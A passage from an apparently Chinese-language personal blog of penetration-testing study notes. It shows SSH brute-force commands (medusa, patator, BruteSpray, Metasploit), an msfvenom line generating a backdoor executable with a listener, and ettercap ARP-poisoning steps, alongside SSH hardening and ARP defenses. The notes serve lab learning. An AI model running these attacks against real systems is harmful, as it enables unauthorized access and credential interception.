<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -M ssh -h 192.168.50.129 -u root -P pw.txt</span><br><span class="line">medusa -M ssh -H hostlist.txt -U userlist.txt -P pw.txt</span><br><span class="line"><span class="comment"># -t 添加线程</span></span><br><span class="line"><span class="comment"># -O 输出到文件</span></span><br></pre></td></tr></table></figure>
<p><img src="medusa-owaspbwa.png" /></p>
<h2 id="patator">patator</h2>
<blockquote>
<p>强大的命令行暴力破解器</p>
<p>A Powerful Command-line Brute-forcer</p>
</blockquote>
<h3 id="可用模块-破解-ssh-密码">可用模块 &amp; 破解 SSH 密码</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看ssh_login模块</span></span><br><span class="line">patator ssh_login --<span class="built_in">help</span></span><br><span class="line">patator ssh_login host=192.168.50.129 user=root password=FILE0 0=passlist.txt</span><br><span class="line">patator ssh_login host=192.168.50.129 user=FILE0 0=userlist.txt password=FILE1 1=passlist.txt</span><br><span class="line">patator ssh_login host=192.168.50.129 user=root password=FILE0 0=passlist.txt -x ignore:mesg=<span class="string">&#x27;Authentication failed.&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="patator.png" /></p>
<h2 id="brutespray">BruteSpray</h2>
<blockquote>
<p>BruteSpray 是一款基于 nmap 扫描输出的 gnmap/XML 文件，自动调用 Medusa 对服务进行爆破(Medusa 是一款端口爆破工具，速度比 Hydra 快)</p>
</blockquote>
<h3 id="kali-安装">Kali 安装</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install brutespray</span><br></pre></td></tr></table></figure>
<h3 id="爆破">爆破</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p22 192.168.50.0/24 -oX 22.xml</span><br><span class="line">brutespray --file 22.xml -U userlist.txt -P passlist.txt --threads 5 --hosts 5</span><br><span class="line">cat /root/brutespray.output/ssh.success.txt</span><br><span class="line"><span class="comment"># -c </span></span><br></pre></td></tr></table></figure>
<p><img src="brutespray.png" /></p>
<h2 id="msf">MSF</h2>
<blockquote>
<p>渗透测试框架</p>
<p>www.metasploit.com</p>
<p>Metasploit Framework(MSF)是一个编写、测试和使用 exploit 代码的完善环境，这个环境为渗透测试、Shellcode 编写和漏洞研究提供了一个可靠平台，这个框架主要是面向对象的 Perl 编程语言编写，并带有由 C 语言、汇编程序和 Python 编写的可选组件</p>
<hr />
<p>探测发现(端口、服务、漏洞)</p>
<p>漏洞验证、攻击、载核</p>
<p>编码混淆</p>
<hr />
<p>Free &amp; Pro</p>
<ol type="1">
<li>命令行 - GUI</li>
<li>手动 - 自动</li>
<li>AV(反病毒软件) - AntiAV</li>
</ol>
</blockquote>
<h3 id="msfconsole">Msfconsole</h3>
<h4 id="漏洞攻击">漏洞攻击</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 显示漏洞模块</span></span><br><span class="line">msf &gt; show exploits</span><br><span class="line"><span class="comment"># 选择excellent</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择某个模块下的漏洞，自动补全</span></span><br><span class="line">use exploit/windows/smb/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填写攻击信息</span></span><br><span class="line"><span class="comment"># 攻击成功，就会执行payload中的指令</span></span><br><span class="line">show payloads</span><br><span class="line"><span class="built_in">set</span> PAYLOAD &lt;Payload name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示信息</span></span><br><span class="line">msf &gt; show info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动攻击</span></span><br><span class="line">exploit</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h4 id="ssh-模块">SSH 模块</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; search ssh</span><br></pre></td></tr></table></figure>
<h4 id="ssh-用户枚举">SSH 用户枚举</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_enumusers</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_enumusers) &gt; show options</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_enumusers) &gt; <span class="built_in">set</span> rhosts 192.168.50.129</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_enumusers) &gt; <span class="built_in">set</span> USER_FILE /root/userlist.txt</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_enumusers) &gt; run</span><br></pre></td></tr></table></figure>
<p><img src="msf-userenumusers.png" /></p>
<h4 id="ssh-版本探测">SSH 版本探测</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_version) &gt; show options</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_version) &gt; <span class="built_in">set</span> rhosts 192.168.50.129</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_version) &gt; run</span><br></pre></td></tr></table></figure>
<p><img src="msf-sshversion.png" /></p>
<h4 id="ssh-暴力破解">SSH 暴力破解</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; show options</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> rhosts 192.168.50.129</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> USER_FILE /root/userlist.txt</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> PASS_FILE /root/passlist.txt</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; run</span><br></pre></td></tr></table></figure>
<p><img src="msf-sshlogin.png" /></p>
<hr />
<h3 id="meterpreter">Meterpreter</h3>
<ul>
<li>会话管理</li>
</ul>
<hr />
<h3 id="msfvenom">Msfvenom</h3>
<ul>
<li><p>payload 生成</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="生成木马后门">生成木马后门</h4>
<ul>
<li><p>生成木马后门</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p payload类型 LHOST=10.211.55.2 LPORT=4444 -f exe &gt; shell.exe</span><br><span class="line">-p     指定payload类型</span><br><span class="line">LHOST  控制端的IP，能够连到</span><br><span class="line">LPORT  控制端的端口</span><br><span class="line">-f     指定文件格式</span><br></pre></td></tr></table></figure></li>
<li><p>生成木马后门连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD &lt;Payload name&gt;</span><br><span class="line"><span class="comment"># 本地需要监听木马中设定的IP，才能测试木马的工作</span></span><br><span class="line"><span class="built_in">set</span> LHOST &lt;Local IP&gt;</span><br><span class="line"><span class="comment"># 同理端口</span></span><br><span class="line"><span class="built_in">set</span> LPORT &lt;Local Port&gt;</span><br><span class="line">run / exploit</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<h3 id="混淆">混淆</h3>
<ul>
<li>混淆 payloads - 绕过杀毒软件等</li>
</ul>
<hr />
<h2 id="暴力破解防御">暴力破解防御</h2>
<ol type="1">
<li><p>useradd shell ⭐</p>
<p>对于不需要登录的用户，需要/sbin/nologin，无需给他可登录的 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useraddd xxx -s /sbin/nologin</span><br><span class="line"><span class="comment"># 一般都是 /bin/bash</span></span><br></pre></td></tr></table></figure></li>
<li><p>密码的复杂性 ⭐</p>
<p>字母大小写 + 数字 + 特殊字符 + 20 位以上 + 定期更换</p></li>
<li><p>修改默认端口 ⭐</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"><span class="comment"># Port 22222</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh_config 客户端文件 sshd_config服务器文件</span></span><br><span class="line"><span class="comment"># 0-65535很难全部扫描</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存指纹信息</span></span><br><span class="line">vim .ssh/known_hosts</span><br><span class="line"><span class="comment"># 实现当第一次连接服务器时，自动接受新的公钥</span></span><br><span class="line">vim /etc/ssh/ssh_config</span><br><span class="line"><span class="comment"># StrictHostKeyChecking no</span></span><br></pre></td></tr></table></figure></li>
<li><p>限制登录的用户或组 ⭐</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config </span><br><span class="line"><span class="comment">#PermitRootLogin yes</span></span><br><span class="line"><span class="comment"># Allowusers xxx</span></span><br><span class="line"><span class="comment"># ssh 192.168.50.129 -l xxx</span></span><br><span class="line"></span><br><span class="line">man sshd_config</span><br><span class="line"><span class="comment"># AllowUsers AllowGroups DenyUsers DenyGroups</span></span><br></pre></td></tr></table></figure></li>
<li><p>使用 sudo ⭐</p>
<p>平时都使用 root 用户的做法是不对的，权限过大</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">visudo</span><br></pre></td></tr></table></figure></li>
<li><p>设置允许的 IP 访问 - 过于陈旧的方法【可选】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/hosts.allow </span><br><span class="line"><span class="comment"># sshd:192.168.50.129:allow</span></span><br><span class="line"><span class="comment"># sshd:all:allow</span></span><br><span class="line">PAM基于IP限制 <span class="comment"># 少用</span></span><br><span class="line">iptables/firewalld</span><br><span class="line">只能允许从堡垒机/跳板机 <span class="comment"># 所有业务限定从跳板机访问</span></span><br></pre></td></tr></table></figure></li>
<li><p>使用软件 DenyHosts 自动统计，只要某个 ip 登录错误三次，就将其加入到/etc/hosts.deny，但不会自动解锁(管理员忘了就完了)</p></li>
<li><p>基于 PAM 实现登录限制⭐【稳】</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">模块：pam_tally2.so</span><br><span class="line">功能：登录统计</span><br><span class="line">示例：实现防止对sshd暴力破解</span><br><span class="line"># pam服务适用于身份验证的第三方服务</span><br><span class="line"></span><br><span class="line">grep tally2 /etc/pam.d/sshd</span><br><span class="line"># vim /etc/pam.d/sshd</span><br><span class="line"># 在最前面加一行 无论什么身份 只要失败两次 就锁定30s</span><br><span class="line">auth required pam_tally2.so deny=2 even_deny_root root_unlock_time=30 unlock_time=30</span><br><span class="line"># 日志查看方式: tail -f var/log/secure</span><br><span class="line"></span><br><span class="line">vim /etc/pam.d/su</span><br><span class="line"># 第一行如下：只要是root就可以随意进入，下面的限制都不用管了</span><br><span class="line">auth sufficient pam_rootok.so</span><br><span class="line"># 假设这一行被放入了/etc/pam.d/sshd中，则远程ssh登录无需正确密码即可登录</span><br></pre></td></tr></table></figure>
<p>暴力软件可能不会隔一段时间重新去尝试，只要发现无法爆破，可能会退出；爆破频率太低</p></li>
<li><p>禁用密码、改用公钥方式认证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">PasswordAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh localhost -v</span></span><br><span class="line"><span class="comment"># gssapi-keyex &gt; publickey &gt; password</span></span><br></pre></td></tr></table></figure></li>
<li><p>保护 xshell 导出会话文件【小心】</p>
<p>在 xshell 文件中保存了很多远程登录机器的信息，通过导出 &gt; 导出密码</p></li>
<li><p>GRUB(多操作系统启动程序)加密【针对本地破解】</p></li>
</ol>
<h1 id="中间人攻击以及防御">中间人攻击以及防御</h1>
<h2 id="原理-2">原理</h2>
<p>利用<strong>ARP 协议</strong>(将 IP 地址解析为 MAC 地址)进行中间人攻击</p>
<p><img src="arp-midt.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp -a</span><br><span class="line">ping 192.168.50.128</span><br><span class="line"><span class="comment"># 查看arp报文</span></span><br><span class="line">tcpdump -i eth0 -nn arp</span><br><span class="line">tcpdump -i eth0 -nn arp and host 192.168.50.128</span><br></pre></td></tr></table></figure>
<p><img src="arp-pakage.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ettercap-graphical</span><br><span class="line">ettercap -G</span><br><span class="line"><span class="comment"># -G 代表图形化</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>Sniff &gt; Unified sniffing... &gt; eth0</p>
<p><img src="ettercap-sniffstart.png" /></p></li>
<li><p>Hosts &gt; Host List（Scan for host） &gt; Add to Target1(其他机器)/2(网关)</p>
<p>Targets &gt; Current targets</p>
<p><img src="ettercap-target.png" /></p></li>
<li><p>Mitm &gt; ARP poisoning... &gt; Sniff remote connections.</p>
<p><img src="mitm-attack.png" /></p></li>
<li><p>被攻击的机器，之后用 arp -a 查看，发现原来网关的 IP 对应的是中间人攻击机器的 MAC 地址，说明攻击成功</p>
<p><img src="mitm-success.png" /></p>
<p><img src="mitm-success-win.png" /></p></li>
<li><p>当被攻击的机器登录一个采用明文协议传输的网站，中间人即可获得登录的用户名和密码</p>
<p><img src="mitm-arp.gif" /></p></li>
</ul>
<h2 id="客户端防御">客户端防御</h2>
<ul>
<li><p>对上网的行为和方式有一定基本保护，如配置防火墙、防 ARP 攻击软件等措施。</p>
<ul>
<li><p>对于 Windows 机器，不相信任何人告诉的 ARP 地址，将正确的网关地址固定下来，变为<strong>静态类型</strong></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">arp -d # 删除</span><br><span class="line"># 绑定IP/MAC</span><br><span class="line"># 法一 - 临时</span><br><span class="line">arp -s IP地址 MAC地址</span><br><span class="line"># 法二 - 永久</span><br><span class="line">netsh i i show <span class="keyword">in</span> # 找准网卡 - 本地连接</span><br><span class="line">netsh -c &quot;i i&quot; ad ne <span class="number">18</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">200</span> <span class="number">00</span>-aa-<span class="number">00</span>-<span class="number">62</span>-c6-<span class="number">09</span> store=active</span><br><span class="line"># <span class="number">18</span> Idx值 store=persistent</span><br><span class="line"># 删除</span><br><span class="line">netsh -c &quot;i i&quot; delete neighbors <span class="number">18</span></span><br></pre></td></tr></table></figure></li>
<li><p>对于 Linux 机器， <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip neigh</span><br><span class="line">arp -s IP地址 MAC地址</span><br><span class="line"><span class="comment"># PERMANET STALE</span></span><br></pre></td></tr></table></figure></p></li>
</ul></li>
</ul>
<h2 id="服务器防御-https-实现网站数据加密">服务器防御 ⭐ HTTPS 实现网站数据加密</h2>
<blockquote>
<ul>
<li>HTTPS 加密机制</li>
<li>wordpress 环境准备</li>
<li>SSL 证书申请流程</li>
<li>SSL 证书使用及测试</li>
<li>Kali Linux 中间人攻击测试</li>
</ul>
</blockquote>
<h3 id="https-加密机制">HTTPS 加密机制</h3>
<p>协议：网络协议的简称，网络协议是通信计算机双方必须共同遵守的一组约定(建立连接、互相识别)，只有遵守这个约定，计算机之间才能相互通信交流</p>
<p>HTTP</p>
<ul>
<li>获取服务器(其他电脑的一些文件)</li>
<li>简单快速：客户向服务器请求服务，只需传送请求方法和路径</li>
<li>灵活、无连接</li>
<li>明文协议</li>
<li>HTTP 协议潜在漏洞</li>
</ul>
<p>HTTPS</p>
<ul>
<li><p>即 HTTP over TLS/SSL，是一种<strong>加密信道</strong>进行 HTTP 内容传输的协议</p></li>
<li><p>HTTP/TCP/IP(HTTP)</p></li>
<li><p>HTTP/SSL 或者 TSL/TCP/IP(HTTPS)</p></li>
<li><p>原理</p>
<p><img src="https.png" /></p>
<p><img src="https-explain.png" /></p></li>
</ul>
<hr />
<h1 id="cc-攻击和-ddos-攻击的区别">CC 攻击和 DDos 攻击的区别</h1>
<p>DDOS：针对网络，传统防火墙</p>
<p>CC：针对应用，waf</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Purplezi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://purplezi.gitee.io/2021/03/12/hacker-learning/">https://purplezi.gitee.io/2021/03/12/hacker-learning/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/hacker/">hacker</a></div><div class="post_share"><div class="social-share" data-image="https://w.wallhaven.cc/full/j8/wallhaven-j8lkxw.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/03/13/binary-search/"><img class="prev-cover" src="/img/bg2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">二分查找【binary search】</div></div></a></div><div class="next-post pull-right"><a href="/2021/03/11/c-fundamental-function/"><img class="next-cover" src="https://w.wallhaven.cc/full/e7/wallhaven-e7z65r.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">【C 语言基础】函数</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Purplezi</div><div class="author-info__description">DreamCreator & DreamLoser</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">20</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">攻击环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">文件上传漏洞渗透攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#burpsuite"><span class="toc-number">2.1.1.</span> <span class="toc-text">Burpsuite</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80"><span class="toc-number">2.2.</span> <span class="toc-text">中国菜刀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B"><span class="toc-number">2.2.1.</span> <span class="toc-text">使用简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90"><span class="toc-number">2.2.2.</span> <span class="toc-text">原理解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F%E9%98%B2%E5%BE%A1"><span class="toc-number">2.3.</span> <span class="toc-text">文件上传漏洞渗透防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB-file-inclusion"><span class="toc-number">3.</span> <span class="toc-text">文件包含漏洞渗透攻击 File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">3.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB---%E6%8E%92%E5%9C%A8%E7%AC%AC%E4%B8%80%E4%BD%8D%E7%9A%84%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9"><span class="toc-number">4.</span> <span class="toc-text">SQL 注入攻击 - 排在第一位的安全风险</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-%E5%9F%BA%E7%A1%80%E5%9B%9E%E9%A1%BE"><span class="toc-number">4.1.</span> <span class="toc-text">SQL 基础回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">4.2.</span> <span class="toc-text">SQL 注入流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98"><span class="toc-number">4.3.</span> <span class="toc-text">手动注入实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E6%B3%A8%E5%85%A5---%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.3.1.</span> <span class="toc-text">基于错误的注入 - 判断是否有注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.2.</span> <span class="toc-text">基于布尔的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-union-%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.3.</span> <span class="toc-text">基于 UNION 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.3.4.</span> <span class="toc-text">基于时间的盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.</span> <span class="toc-text">sqlmap 自动化注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get-%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.1.</span> <span class="toc-text">GET 方法注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post-%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.2.</span> <span class="toc-text">POST 方法注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E8%8E%B7%E5%8F%96"><span class="toc-number">4.4.3.</span> <span class="toc-text">数据获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C"><span class="toc-number">4.4.4.</span> <span class="toc-text">提权操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E5%AE%9E%E4%BE%8B"><span class="toc-number">4.4.5.</span> <span class="toc-text">综合实例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dvwa-sql-injection"><span class="toc-number">4.5.</span> <span class="toc-text">dvwa sql injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E9%98%B2%E6%8A%A4"><span class="toc-number">4.5.1.</span> <span class="toc-text">代码层面防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dvwa-sql-injectionblind"><span class="toc-number">4.6.</span> <span class="toc-text">dvwa sql injection(Blind)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xss-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">XSS 跨站脚本攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-%E7%AE%80%E4%BB%8B"><span class="toc-number">5.1.</span> <span class="toc-text">XSS 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-%E5%8E%9F%E7%90%86"><span class="toc-number">5.2.</span> <span class="toc-text">XSS 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-xss-%E8%84%9A%E6%9C%AC"><span class="toc-number">5.3.</span> <span class="toc-text">构造 XSS 脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84-html-%E6%A0%87%E7%AD%BE"><span class="toc-number">5.3.1.</span> <span class="toc-text">常用的 HTML 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81-javascript-%E6%96%B9%E6%B3%95"><span class="toc-number">5.3.2.</span> <span class="toc-text">常见 JavaScript 方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-xss-%E8%84%9A%E6%9C%AC-1"><span class="toc-number">5.3.3.</span> <span class="toc-text">构造 XSS 脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-xss-reflected"><span class="toc-number">5.4.</span> <span class="toc-text">反射型 XSS (XSS reflected)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-xss-xss-stored"><span class="toc-number">5.5.</span> <span class="toc-text">存储型 XSS (XSS stored)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dom-%E5%9E%8B-xss"><span class="toc-number">5.6.</span> <span class="toc-text">DOM 型 XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96-xss"><span class="toc-number">5.7.</span> <span class="toc-text">自动化 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#beef-%E7%AE%80%E4%BB%8B"><span class="toc-number">5.7.1.</span> <span class="toc-text">BeEF 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#beef-%E5%9F%BA%E7%A1%80"><span class="toc-number">5.7.2.</span> <span class="toc-text">BeEF 基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">5.7.3.</span> <span class="toc-text">信息收集</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">6.</span> <span class="toc-text">Web 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87"><span class="toc-number">6.1.</span> <span class="toc-text">搜索引擎篇</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#google-hacking"><span class="toc-number">6.1.1.</span> <span class="toc-text">Google Hacking</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">6.1.1.1.</span> <span class="toc-text">关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">6.1.1.2.</span> <span class="toc-text">实例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7"><span class="toc-number">6.1.1.3.</span> <span class="toc-text">符号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.1.1.4.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shodan-hacking"><span class="toc-number">6.1.2.</span> <span class="toc-text">Shodan Hacking</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-number">6.1.2.1.</span> <span class="toc-text">关键词</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 